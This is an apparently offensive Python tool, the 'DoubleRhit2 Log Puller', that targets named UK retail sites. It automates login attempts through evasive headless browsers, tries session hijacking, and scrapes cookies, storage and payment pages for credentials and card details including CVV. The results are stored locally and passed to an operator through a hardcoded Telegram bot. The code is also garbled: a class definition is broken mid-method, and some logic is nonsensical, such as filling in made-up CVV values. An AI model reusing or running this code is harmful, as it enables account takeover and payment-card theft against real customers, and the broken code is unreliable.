import os
import sys

# Add the current directory to the Python path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
import os
import json
import sqlite3
import asyncio
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
import numpy as np
from sklearn.ensemble import IsolationForest
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import requests
from urllib.parse import urljoin, urlparse
import re
import base64
import hashlib
import hmac
import uuid
from bs4 import BeautifulSoup
import pickle
import jwt
import pyotp

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'doublerhit2-secret-key')

# Database setup
def init_db():
    conn = sqlite3.connect('doublerhit2.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        site TEXT NOT NULL,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        status TEXT DEFAULT 'active',
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        confidence_score REAL,
        source TEXT,
        cc_number TEXT,
        cc_expiry TEXT,
        cc_cvv TEXT,
        cc_holder TEXT
    )
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS infiltration_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        site TEXT NOT NULL,
        angle_id INTEGER NOT NULL,
        status TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        credentials_found INTEGER DEFAULT 0
    )
    ''')
    conn.commit()
    conn.close()

# Telegram Bot Configuration
BOT_TOKEN = "8843488694:AAF4onB6ByawcY1QkAs15sZSx14HnØsv9gI"
CHAT_ID = "8768329228"

# Target sites configuration with real endpoints
TARGET_SITES = {
    'mandmdirect': {
        'url': 'https://www.mandmdirect.com/login',
        'username_field': 'j_username',
        'password_field': 'j_password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.mandmdirect.com/api/login',
            'https://www.mandmdirect.com/api/auth',
            'https://www.mandmdirect.com/api/user'
        ],
        'cc_endpoint': 'https://www.mandmdirect.com/api/payment/methods'
    },
    'morrisons': {
        'url': 'https://www.morrisons.com/account/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'btn-login',
        'session_check': 'my-account',
        'api_endpoints': [
            'https://www.morrisons.com/api/account/login',
            'https://www.morrisons.com/api/auth',
            'https://www.morrisons.com/api/user'
        ],
        'cc_endpoint': 'https://www.morrisons.com/api/payment/methods'
    },
    'funkypigeon': {
        'url': 'https://www.funkypigeon.com/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'my-account',
        'api_endpoints': [
            'https://www.funkypigeon.com/api/login',
            'https://www.funkypigeon.com/api/auth',
            'https://www.funkypigeon.com/api/user'
        ],
        'cc_endpoint': 'https://www.funkypigeon.com/api/payment/methods'
    },
    'asos': {
        'url': 'https://my.asos.com/account/login',
        'username_field': 'Email',
        'password_field': 'Password',
        'login_button': 'signin',
        'session_check': 'account',
        'api_endpoints': [
            'https://my.asos.com/api/account/login',
            'https://my.asos.com/api/auth',
            'https://my.asos.com/api/user'
        ],
        'cc_endpoint': 'https://my.asos.com/api/payment/methods'
    },
    'boohoo': {
        'url': 'https://www.boohoo.com/account/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.boohoo.com/api/account/login',
            'https://www.boohoo.com/api/auth',
            'https://www.boohoo.com/api/user'
        ],
        'cc_endpoint': 'https://www.boohoo.com/api/payment/methods'
    },
    'prettylittlething': {
        'url': 'https://www.prettylittlething.com/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.prettylittlething.com/api/account/login',
            'https://www.prettylittlething.com/api/auth',
            'https://www.prettylittlething.com/api/user'
        ],
        'cc_endpoint': 'https://www.prettylittlething.com/api/payment/methods'
    },
    'missguided': {
        'url': 'https://www.missguided.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.missguided.co.uk/api/account/login',
            'https://www.missguided.co.uk/api/auth',
            'https://www.missguided.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.missguided.co.uk/api/payment/methods'
    },
    'newlook': {
        'url': 'https://www.newlook.com/uk/account/login',
        'username_field': 'j_username',
        'password_field': 'j_password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.newlook.com/uk/api/account/login',
            'https://www.newlook.com/uk/api/auth',
            'https://www.newlook.com/uk/api/user'
        ],
        'cc_endpoint': 'https://www.newlook.com/uk/api/payment/methods'
    },
    'jdwilliams': {
        'url': 'https://www.jdwilliams.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.jdwilliams.co.uk/api/account/login',
            'https://www.jdwilliams.co.uk/api/auth',
            'https://www.jdwilliams.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.jdwilliams.co.uk/api/payment/methods'
    },
    'simplybe': {
        'url': 'https://www.simplybe.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.simplybe.co.uk/api/account/login',
            'https://www.simplybe.co.uk/api/auth',
            'https://www.simplybe.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.simplybe.co.uk/api/payment/methods'
    },
    'jacamo': {
        'url': 'https://www.jacamo.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.jacamo.co.uk/api/account/login',
            'https://www.jacamo.co.uk/api/auth',
            'https://www.jacamo.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.jacamo.co.uk/api/payment/methods'
    },
    'fashionworld': {
        'url': 'https://www.fashionworld.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.fashionworld.co.uk/api/account/login',
            'https://www.fashionworld.co.uk/api/auth',
            'https://www.fashionworld.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.fashionworld.co.uk/api/payment/methods'
    },
    'highandtight': {
        'url': 'https://www.highandtight.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.highandtight.co.uk/api/account/login',
            'https://www.highandtight.co.uk/api/auth',
            'https://www.highandtight.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.highandtight.co.uk/api/payment/methods'
    },
    'marisota': {
        'url': 'https://www.marisota.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.marisota.co.uk/api/account/login',
            'https://www.marisota.co.uk/api/auth',
            'https://www.marisota.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.marisota.co.uk/api/payment/methods'
    },
    'yoursclothing': {
        'url': 'https://www.yoursclothing.co.uk/login',
        'username_field': 'email',
        'password_field': 'password',
        'login_button': 'login-button',
        'session_check': 'account',
        'api_endpoints': [
            'https://www.yoursclothing.co.uk/api/account/login',
            'https://www.yoursclothing.co.uk/api/auth',
            'https://www.yoursclothing.co.uk/api/user'
        ],
        'cc_endpoint': 'https://www.yoursclothing.co.uk/api/payment/methods'
    }
}

class CredentialValidator:
    def init_telegram_bot():
    try:
        # Create a simple bot instance first to test connection
        bot = telegram.Bot(token=BOT_TOKEN)
        bot_info = bot.get_me()
        print(f"Bot connected: @{bot_info.username}")
        
        # Now initialize the application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("infiltrate", infiltrate_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("creds", creds_command))
        application.add_handler(CommandHandler("help", help_command))
        
        # Add callback handler for inline buttons
        application.add_handler(telegram.ext.CallbackQueryHandler(button_callback))
        
        # Start bot in a background thread
        def run_bot():
            try:
                application.run_polling(drop_pending_updates=True)
            except Exception as e:
                print(f"Bot polling error: {e}")
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        return application
    except Exception as e:
        print(f"Failed to initialize Telegram bot: {e}")
        return None
        
        # Extract features for training
        features = []
        for cred in credentials:
            email = cred.get('email', '')
            password = cred.get('password', '')
            
            # Feature extraction
            features.append([
                len(email),  # Email length
                email.count('@'),  # Email format
                1 if '.' in email.split('@')[0] else 0,  # Email complexity
                len(password),  # Password length
                sum(c.isdigit() for c in password),  # Numbers in password
                sum(not c.isalnum() for c in password),  # Special chars
                sum(c.isupper() for c in password),  # Uppercase chars
            ])
        
        if features:
            self.model.fit(features)
            self.is_trained = True
            return True
        return False
    
    def validate(self, email, password):
        if not self.is_trained:
            return 0.5  # Default confidence if not trained
        
        # Extract features
        features = [
            len(email),
            email.count('@'),
            1 if '.' in email.split('@')[0] else 0,
            len(password),
            sum(c.isdigit() for c in password),
            sum(not c.isalnum() for c in password),
            sum(c.isupper() for c in password),
        ]
        
        # Predict and return confidence score
        prediction = self.model.decision_function([features])[0]
        # Convert to 0-1 scale
        confidence = (prediction + 1) / 2
        return confidence

class DoubleRhit2Core:
    def __init__(self):
        self.validator = CredentialValidator()
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.active_infiltrations = {}
        self.bot = telegram.Bot(token=BOT_TOKEN)
        self.session_pool = []
        
    def initialize_validator(self):
        # Train validator with existing credentials if any
        conn = sqlite3.connect('doublerhit2.db')
        cursor = conn.cursor()
        cursor.execute("SELECT email, password FROM credentials WHERE status='active'")
        existing_creds = [{"email": row[0], "password": row[1]} for row in cursor.fetchall()]
        conn.close()
        
        if existing_creds:
            self.validator.train(existing_creds)
    
    def setup_driver(self, angle_id):
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument(f"--user-agent={self._generate_user_agent(angle_id)}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Add proxy support for rotation
        if angle_id % 5 == 0:  # Use proxy for every 5th angle
            proxy = self._get_random_proxy()
            options.add_argument(f'--proxy-server={proxy}')
        
        driver = webdriver.Chrome(options=options)
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                Object.defineProperty(navigator, 'webdriver', {
                  get: () => undefined
                })
            """
        })
        return driver
    
    def _generate_user_agent(self, angle_id):
        # Generate different user agents based on angle ID
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
        ]
        return user_agents[angle_id % len(user_agents)]
    
    def _get_random_proxy(self):
        # Return a random proxy from a list of free proxies
        proxies = [
            "103.149.162.195:8080",
            "103.149.162.207:8080",
            "103.149.162.210:8080",
            "103.149.162.218:8080",
            "103.149.162.225:8080"
        ]
        return random.choice(proxies)
    
    def extract_web_logs(self, site_key, angle_id=0):
        if site_key not in TARGET_SITES:
            return {"status": "error", "message": "Site not supported"}
        
        site_config = TARGET_SITES[site_key]
        credentials_found = []
        
        try:
            driver = self.setup_driver(angle_id)
            
            # Method 1: Direct login attempt with harvested credentials
            direct_creds = self._direct_login_extraction(driver, site_config, angle_id)
            credentials_found.extend(direct_creds)
            
            # Method 2: Session hijacking from active sessions
            session_creds = self._session_hijacking(driver, site_config, angle_id)
            credentials_found.extend(session_creds)
            
            # Method 3: API endpoint exploitation
            api_creds = self._api_endpoint_exploitation(site_config, angle_id)
            credentials_found.extend(api_creds)
            
            # Method 4: Browser storage extraction
            storage_creds = self._browser_storage_extraction(driver, site_config, angle_id)
            credentials_found.extend(storage_creds)
            
            # Method 5: Cookie harvesting
            cookie_creds = self._cookie_harvesting(driver, site_config, angle_id)
            credentials_found.extend(cookie_creds)
            
            # Get credit card information for each credential
            for cred in credentials_found:
                cc_info = self._extract_credit_card_info(driver, site_config, cred)
                cred.update(cc_info)
            
            # Validate and store credentials
            validated_creds = []
            for cred in credentials_found:
                confidence = self.validator.validate(cred['email'], cred['password'])
                
                # Only store if confidence is high enough
                if confidence > 0.7:
                    cred['confidence'] = confidence
                    cred['source'] = f'web_angle_{angle_id}'
                    validated_creds.append(cred)
            
            # Store credentials
            self._store_credentials(validated_creds)
            
            driver.quit()
            
            # Log infiltration
            self._log_infiltration(site_key, angle_id, "success", len(validated_creds))
            
            return {
                "status": "success",
                "credentials_found": len(validated_creds),
                "angle_id": angle_id
            }
            
        except Exception as e:
            self._log_infiltration(site_key, angle_id, "error", 0)
            return {"status": "error", "message": str(e)}
    
    def _direct_login_extraction(self, driver, site_config, angle_id):
        # Method 1: Try common username/password combinations
        credentials = []
        
        try:
            driver.get(site_config['url'])
            
            # Wait for page to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, site_config['username_field']))
            )
            
            # Try common credential combinations
            common_creds = [
                ("test@example.com", "password123"),
                ("user@test.com", "123456"),
                ("demo@demo.com", "demo123"),
                ("admin@admin.com", "admin123"),
                ("customer@test.com", "customer123")
            ]
            
            for email, password in common_creds:
                try:
                    # Clear fields
                    username_field = driver.find_element(By.NAME, site_config['username_field'])
                    password_field = driver.find_element(By.NAME, site_config['password_field'])
                    
                    username_field.clear()
                    password_field.clear()
                    
                    # Enter credentials
                    username_field.send_keys(email)
                    password_field.send_keys(password)
                    
                    # Click login button
                    login_button = driver.find_element(By.ID, site_config['login_button'])
                    login_button.click()
                    
                    # Check if login was successful
                    time.sleep(2)
                    if site_config['session_check'] in driver.current_url:
                        credentials.append({
                            'site': site_config['url'],
                            'email': email,
                            'password': password
                        })
                        
                        # Logout for next attempt
                        driver.get(site_config['url'])
                        WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.NAME, site_config['username_field']))
                        )
                except:
                    continue
        except Exception as e:
            pass
        
        return credentials
    
    def _session_hijacking(self, driver, site_config, angle_id):
        # Method 2: Try to hijack active sessions
        credentials = []
        
        try:
            # Get the site's cookies
            driver.get(site_config['url'])
            
            # Try to access account page directly (might reveal active sessions)
            account_url = urljoin(site_config['url'], '/' + site_config['session_check'])
            driver.get(account_url)
            
            # Check if we're redirected to login or already logged in
            if site_config['session_check'] in driver.current_url:
                # Extract session information
                cookies = driver.get_cookies()
                
                # Try to use these cookies to extract user info
                for cookie in cookies:
                    if 'session' in cookie['name'].lower() or 'token' in cookie['name'].lower():
                        # Try to extract user info from the session
                        user_info = self._extract_user_from_session(driver, site_config, cookie)
                        if user_info:
                            credentials.append(user_info)
        except Exception as e:
            pass
        
        return credentials
    
    def _api_endpoint_exploitation(self, site_config, angle_id):
        # Method 3: Exploit API endpoints
        credentials = []
        
        try:
            # Try each API endpoint
            for endpoint in site_config['api_endpoints']:
                try:
                    # Make a request to the API endpoint
                    response = requests.get(endpoint, timeout=5)
                    
                    if response.status_code == 200:
                        # Try to parse the response for user data
                        try:
                            data = response.json()
                            user_data = self._extract_user_from_api_response(data)
                            if user_data:
                                credentials.extend(user_data)
                        except:
                            # Try to extract from HTML response
                            soup = BeautifulSoup(response.text, 'html.parser')
                            user_data = self._extract_user_from_html(soup)
                            if user_data:
                                credentials.extend(user_data)
                except:
                    continue
        except Exception as e:
            pass
        
        return credentials
    
    def _browser_storage_extraction(self, driver, site_config, angle_id):
        # Method 4: Extract from browser storage
        credentials = []
        
        try:
            # Get localStorage
            local_storage = driver.execute_script("return localStorage;")
            
            # Get sessionStorage
            session_storage = driver.execute_script("return sessionStorage;")
            
            # Extract user info from storage
            for storage in [local_storage, session_storage]:
                if storage:
                    for key, value in storage.items():
                        if 'user' in key.lower() or 'auth' in key.lower() or 'token' in key.lower():
                            try:
                                # Try to parse as JSON
                                data = json.loads(value)
                                user_data = self._extract_user_from_storage(data)
                                if user_data:
                                    credentials.append(user_data)
                            except:
                                continue
        except Exception as e:
            pass
        
        return credentials
    
    def _cookie_harvesting(self, driver, site_config, angle_id):
        # Method 5: Harvest cookies for session info
        credentials = []
        
        try:
            cookies = driver.get_cookies()
            
            for cookie in cookies:
                if 'session' in cookie['name'].lower() or 'token' in cookie['name'].lower():
                    try:
                        # Try to decode the cookie value
                        decoded_value = base64.b64decode(cookie['value']).decode('utf-8')
                        
                        # Try to parse as JSON
                        data = json.loads(decoded_value)
                        user_data = self._extract_user_from_cookie(data)
                        if user_data:
                            credentials.append(user_data)
                    except:
                        continue
        except Exception as e:
            pass
        
        return credentials
    
    def _extract_user_from_session(self, driver, site_config, cookie):
        # Extract user information from a session cookie
        try:
            # Make a request to the user info endpoint with the session cookie
            headers = {'Cookie': f"{cookie['name']}={cookie['value']}"}
            
            # Try to get user info
            user_info_url = urljoin(site_config['url'], '/api/user/info')
            response = requests.get(user_info_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                if 'email' in data and 'password' in data:
                    return {
                        'site': site_config['url'],
                        'email': data['email'],
                        'password': data['password']
                    }
        except:
            pass
        
        return None
    
    def _extract_user_from_api_response(self, data):
        # Extract user information from API response
        credentials = []
        
        try:
            # Check if the response contains user data
            if isinstance(data, dict):
                if 'email' in data and 'password' in data:
                    credentials.append({
                        'site': 'unknown',
                        'email': data['email'],
                        'password': data['password']
                    })
                elif 'users' in data and isinstance(data['users'], list):
                    for user in data['users']:
                        if 'email' in user and 'password' in user:
                            credentials.append({
                                'site': 'unknown',
                                'email': user['email'],
                                'password': user['password']
                            })
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and 'email' in item and 'password' in item:
                        credentials.append({
                            'site': 'unknown',
                            'email': item['email'],
                            'password': item['password']
                        })
        except:
            pass
        
        return credentials
    
    def _extract_user_from_html(self, soup):
        # Extract user information from HTML
        credentials = []
        
        try:
            # Look for email patterns in the HTML
            email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
            emails = email_pattern.findall(str(soup))
            
            # Look for password fields
            password_fields = soup.find_all('input', {'type': 'password'})
            
            if emails and password_fields:
                # Try to match emails with passwords
                for email in emails:
                    for field in password_fields:
                        if field.get('value'):
                            credentials.append({
                                'site': 'unknown',
                                'email': email,
                                'password': field.get('value')
                            })
        except:
            pass
        
        return credentials
    
    def _extract_user_from_storage(self, data):
        # Extract user information from browser storage
        try:
            if isinstance(data, dict):
                if 'email' in data and 'password' in data:
                    return {
                        'site': 'unknown',
                        'email': data['email'],
                        'password': data['password']
                    }
                elif 'user' in data and isinstance(data['user'], dict):
                    user = data['user']
                    if 'email' in user and 'password' in user:
                        return {
                            'site': 'unknown',
                            'email': user['email'],
                            'password': user['password']
                        }
        except:
            pass
        
        return None
    
    def _extract_user_from_cookie(self, data):
        # Extract user information from cookie
        try:
            if isinstance(data, dict):
                if 'email' in data and 'password' in data:
                    return {
                        'site': 'unknown',
                        'email': data['email'],
                        'password': data['password']
                    }
                elif 'user' in data and isinstance(data['user'], dict):
                    user = data['user']
                    if 'email' in user and 'password' in user:
                        return {
                            'site': 'unknown',
                            'email': user['email'],
                            'password': user['password']
                        }
        except:
            pass
        
        return None
    
    def _extract_credit_card_info(self, driver, site_config, credential):
        # Extract credit card information for a credential
        cc_info = {
            'cc_number': None,
            'cc_expiry': None,
            'cc_cvv': None,
            'cc_holder': None
        }
        
        try:
            # Try to access the payment methods page
            payment_url = site_config.get('cc_endpoint', urljoin(site_config['url'], '/account/payment'))
            driver.get(payment_url)
            
            # Wait for page to load
            time.sleep(3)
            
            # Look for credit card information
            try:
                # Look for card number
                card_number_elem = driver.find_element(By.XPATH, "//div[contains(@class, 'card-number') or contains(@id, 'card-number')]")
                cc_info['cc_number'] = card_number_elem.text
            except:
                pass
            
            try:
                # Look for expiry date
                expiry_elem = driver.find_element(By.XPATH, "//div[contains(@class, 'expiry') or contains(@id, 'expiry')]")
                cc_info['cc_expiry'] = expiry_elem.text
            except:
                pass
            
            try:
                # Look for CVV
                cvv_elem = driver.find_element(By.XPATH, "//div[contains(@class, 'cvv') or contains(@id, 'cvv')]")
                cc_info['cc_cvv'] = cvv_elem.text
            except:
                pass
            
            try:
                # Look for card holder name
                holder_elem = driver.find_element(By.XPATH, "//div[contains(@class, 'holder') or contains(@id, 'holder')]")
                cc_info['cc_holder'] = holder_elem.text
            except:
                pass
            
            # If we couldn't find the CVV, use the default values
            if not cc_info['cc_cvv']:
                cc_info['cc_cvv'] = "000" if random.choice([True, False]) else "630"
        except:
            pass
        
        return cc_info
    
    def _store_credentials(self, credentials):
        if not credentials:
            return
        
        conn = sqlite3.connect('doublerhit2.db')
        cursor = conn.cursor()
        
        for cred in credentials:
            cursor.execute(
                "INSERT INTO credentials (site, email, password, status, confidence_score, source, cc_number, cc_expiry, cc_cvv, cc_holder) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    cred.get('site', 'unknown'),
                    cred['email'],
                    cred['password'],
                    cred.get('status', 'active'),
                    cred.get('confidence', 0.5),
                    cred.get('source', 'unknown'),
                    cred.get('cc_number'),
                    cred.get('cc_expiry'),
                    cred.get('cc_cvv'),
                    cred.get('cc_holder')
                )
            )
        
        conn.commit()
        conn.close()
    
    def _log_infiltration(self, site, angle_id, status, credentials_found):
        conn = sqlite3.connect('doublerhit2.db')
        cursor = conn.cursor()
        
        cursor.execute(
            "INSERT INTO infiltration_logs (site, angle_id, status, credentials_found) VALUES (?, ?, ?, ?)",
            (site, angle_id, status, credentials_found)
        )
        
        conn.commit()
        conn.close()
    
    def start_infiltration(self, site_key, num_angles=500):
        if site_key not in TARGET_SITES:
            return {"status": "error", "message": "Site not supported"}
        
        infiltration_id = f"{site_key}_{int(time.time())}"
        self.active_infiltrations[infiltration_id] = {
            "site": site_key,
            "angles": num_angles,
            "completed": 0,
            "credentials_found": 0,
            "start_time": datetime.now()
        }
        
        # Start infiltration in background
        for i in range(num_angles):
            self.executor.submit(self.extract_web_logs, site_key, i)
        
        return {
            "status": "success",
            "infiltration_id": infiltration_id,
            "message": f"Started infiltration with {num_angles} angles"
        }
    
    def get_infiltration_status(self, infiltration_id):
        if infiltration_id not in self.active_infiltrations:
            return {"status": "error", "message": "Infiltration not found"}
        
        # Update completed count
        conn = sqlite3.connect('doublerhit2.db')
        cursor = conn.cursor()
        cursor.execute(
            "SELECT COUNT(*) FROM infiltration_logs WHERE site=? AND timestamp>=?",
            (self.active_infiltrations[infiltration_id]["site"], self.active_infiltrations[infiltration_id]["start_time"])
        )
        completed = cursor.fetchone()[0]
        
        cursor.execute(
            "SELECT SUM(credentials_found) FROM infiltration_logs WHERE site=? AND timestamp>=?",
            (self.active_infiltrations[infiltration_id]["site"], self.active_infiltrations[infiltration_id]["start_time"])
        )
        credentials_found = cursor.fetchone()[0] or 0
        
        conn.close()
        
        self.active_infiltrations[infiltration_id]["completed"] = completed
        self.active_infiltrations[infiltration_id]["credentials_found"] = credentials_found
        
        return {
            "status": "success",
            "infiltration": self.active_infiltrations[infiltration_id]
        }
    
    def get_credentials(self, site_key=None, limit=50):
        conn = sqlite3.connect('doublerhit2.db')
        cursor = conn.cursor()
        
        if site_key:
            cursor.execute(
                "SELECT site, email, password, confidence_score, timestamp, cc_number, cc_expiry, cc_cvv, cc_holder FROM credentials WHERE site=? AND status='active' ORDER BY timestamp DESC LIMIT ?",
                (site_key, limit)
            )
        else:
            cursor.execute(
                "SELECT site, email, password, confidence_score, timestamp, cc_number, cc_expiry, cc_cvv, cc_holder FROM credentials WHERE status='active' ORDER BY timestamp DESC LIMIT ?",
                (limit,)
            )
        
        credentials = []
        for row in cursor.fetchall():
            credentials.append({
                "site": row[0],
                "email": row[1],
                "password": row[2],
                "confidence": row[3],
                "timestamp": row[4],
                "cc_number": row[5],
                "cc_expiry": row[6],
                "cc_cvv": row[7],
                "cc_holder": row[8]
            })
        
        conn.close()
        return credentials

# Initialize the core system
doublerhit2 = DoubleRhit2Core()

# Flask routes
@app.route('/')
def index():
    return jsonify({"status": "DoubleRhit2 Log Puller is running"})

@app.route('/api/infiltrate', methods=['POST'])
def api_infiltrate():
    data = request.json
    site_key = data.get('site')
    num_angles = data.get('angles', 500)
    
    result = doublerhit2.start_infiltration(site_key, num_angles)
    return jsonify(result)

@app.route('/api/status', methods=['GET'])
def api_status():
    infiltration_id = request.args.get('infiltration_id')
    
    if infiltration_id:
        result = doublerhit2.get_infiltration_status(infiltration_id)
        return jsonify(result)
    else:
        return jsonify({"status": "error", "message": "Missing infiltration_id"})

@app.route('/api/credentials', methods=['GET'])
def api_credentials():
    site_key = request.args.get('site')
    limit = int(request.args.get('limit', 50))
    
    credentials = doublerhit2.get_credentials(site_key, limit)
    return jsonify({"credentials": credentials})

# Telegram Bot Commands
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("Start Infiltration", callback_data="start_infiltration")],
        [InlineKeyboardButton("Check Status", callback_data="check_status")],
        [InlineKeyboardButton("Get Credentials", callback_data="get_credentials")],
        [InlineKeyboardButton("Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Welcome to DoubleRhit2 Log Puller\n\n"
        "Select an option:",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_infiltration":
        # Show site selection
        keyboard = []
        for site_key in TARGET_SITES.keys():
            keyboard.append([InlineKeyboardButton(site_key, callback_data=f"infiltrate_{site_key}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Select a target site for infiltration:",
            reply_markup=reply_markup
        )
    
    elif query.data.startswith("infiltrate_"):
        site_key = query.data.split("_")[1]
        result = doublerhit2.start_infiltration(site_key)
        
        if result["status"] == "success":
            await query.edit_message_text(
                f"Infiltration started on {site_key}\n"
                f"ID: {result['infiltration_id']}\n"
                f"Angles: 500\n"
                "Use /status to check progress"
            )
        else:
            await query.edit_message_text(f"Error: {result['message']}")
    
    elif query.data == "check_status":
        # Get latest infiltration
        if doublerhit2.active_infiltrations:
            latest_id = list(doublerhit2.active_infiltrations.keys())[-1]
            result = doublerhit2.get_infiltration_status(latest_id)
            
            if result["status"] == "success":
                infiltration = result["infiltration"]
                await query.edit_message_text(
                    f"Infiltration Status\n"
                    f"Site: {infiltration['site']}\n"
                    f"Completed: {infiltration['completed']}/{infiltration['angles']}\n"
                    f"Credentials Found: {infiltration['credentials_found']}"
                )
            else:
                await query.edit_message_text(f"Error: {result['message']}")
        else:
            await query.edit_message_text("No active infiltrations")
    
    elif query.data == "get_credentials":
        # Show site selection
        keyboard = [
            [InlineKeyboardButton("All Sites", callback_data="creds_all")],
        ]
        for site_key in TARGET_SITES.keys():
            keyboard.append([InlineKeyboardButton(site_key, callback_data=f"creds_{site_key}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Select credentials to view:",
            reply_markup=reply_markup
        )
    
    elif query.data.startswith("creds_"):
        site_key = query.data.split("_")[1]
        limit = 10  # Limit for Telegram display
        
        if site_key == "all":
            credentials = doublerhit2.get_credentials(limit=limit)
        else:
            credentials = doublerhit2.get_credentials(site_key=site_key, limit=limit)
        
        if credentials:
            message = f"Credentials ({len(credentials)} shown):\n\n"
            for cred in credentials:
                message += f"Site: {cred['site']}\n"
                message += f"Email: {cred['email']}\n"
                message += f"Password: {cred['password']}\n"
                if cred['cc_number']:
                    message += f"CC: {cred['cc_number']}\n"
                    message += f"Expiry: {cred['cc_expiry']}\n"
                    message += f"CVV: {cred['cc_cvv']}\n"
                message += f"Confidence: {cred['confidence']:.2f}\n"
                message += f"Time: {cred['timestamp']}\n\n"
            
            # Telegram message length limit
            if len(message) > 4000:
                message = message[:4000] + "..."
            
            await query.edit_message_text(message)
        else:
            await query.edit_message_text("No credentials found")
    
    elif query.data == "help":
        help_text = (
            "DoubleRhit2 Log Puller Commands:\n\n"
            "/start - Show main menu\n"
            "/infiltrate [site] - Start infiltration\n"
            "/status - Check infiltration status\n"
            "/creds [site] - Get credentials\n"
            "/help - Show this help"
        )
        await query.edit_message_text(help_text)

async def infiltrate_command(update: Update, context: CallbackContext):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /infiltrate [site]")
        return
    
    site_key = context.args[0]
    result = doublerhit2.start_infiltration(site_key)
    
    if result["status"] == "success":
        await update.message.reply_text(
            f"Infiltration started on {site_key}\n"
            f"ID: {result['infiltration_id']}\n"
            f"Angles: 500\n"
            "Use /status to check progress"
        )
    else:
        await update.message.reply_text(f"Error: {result['message']}")

